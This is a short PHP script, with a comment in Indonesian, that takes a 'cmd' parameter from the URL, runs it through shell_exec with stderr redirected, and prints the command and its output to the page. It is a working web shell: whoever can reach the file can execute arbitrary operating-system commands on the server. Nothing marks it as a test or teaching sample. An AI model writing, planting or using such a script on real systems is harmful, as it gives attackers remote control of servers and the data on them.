<?php
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'whoami';
// redirect stderr ke stdout supaya bisa dilihat
$output = shell_exec($cmd . ' 2>&1');
echo "<pre>CMD: $cmd\n\nOUTPUT:\n$output</pre>";
?>